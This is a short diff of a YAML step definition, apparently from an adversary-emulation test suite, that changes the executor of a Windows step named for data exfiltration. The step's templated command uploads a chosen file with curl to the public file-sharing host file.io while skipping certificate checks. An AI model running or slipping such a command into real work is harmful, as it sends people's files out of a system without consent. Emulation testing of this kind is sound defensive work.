@@ -40,4 +40,4 @@ steps:
     - name: exfiltrate-data-https-using-curl-windows
       inline: |
         {{.Args.curl_path}} -k -F "file=@{{.Args.input_file}}" https://file.io/
-      executor: command_prompt
+      executor: cmd
